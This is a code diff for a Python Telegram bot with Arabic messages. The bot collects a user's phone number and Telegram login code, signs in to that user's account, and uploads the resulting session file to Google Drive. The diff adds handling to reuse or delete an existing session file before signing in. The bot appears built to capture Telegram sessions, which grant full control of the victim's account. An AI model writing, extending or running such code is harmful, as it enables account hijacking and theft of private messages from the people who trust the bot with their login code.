@@ -124,6 +124,7 @@ async def process_phone(update, context):
         await update.message.reply_text(f"حدث خطأ: {e}")
         return PHONE    
 
+
 async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     code = update.message.text.strip().replace(" ", "")
@@ -135,7 +136,22 @@ async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("حدث خطأ. الرجاء بدء العملية من جديد باستخدام /start.")
         return ConversationHandler.END
 
+    session_file = f"/tmp/session_{user_id}.session"
+
     try:
+        # إذا كان ملف الجلسة موجودًا، تحقق من صلاحيته
+        if os.path.exists(session_file):
+            try:
+                await client.connect()
+                if await client.is_user_authorized():
+                    await update.message.reply_text("تم استخدام ملف الجلسة الموجود بنجاح!")
+                else:
+                    raise Exception("ملف الجلسة موجود ولكنه غير صالح.")
+            except Exception as e:
+                # إذا كان الملف غير صالح، احذفه
+                os.remove(session_file)
+                await update.message.reply_text("تم العثور على ملف جلسة تالف. جارٍ إنشاء ملف جديد...")
+        
         # تسجيل الدخول باستخدام الرمز
         await client.sign_in(phone=phone_number, code=code)
 
@@ -144,7 +160,6 @@ async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("تم تسجيل الدخول بنجاح! جاري رفع ملف الجلسة...")
 
             # رفع ملف الجلسة
-            session_file = f"/tmp/session_{user_id}.session"
             if os.path.exists(session_file):
                 upload_media = MediaFileUpload(session_file, resumable=True)
                 uploaded_file = drive_service.files().create(
@@ -172,6 +187,7 @@ async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"حدث خطأ أثناء تسجيل الدخول: {e}")
         return CODE
+
 
 async def process_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
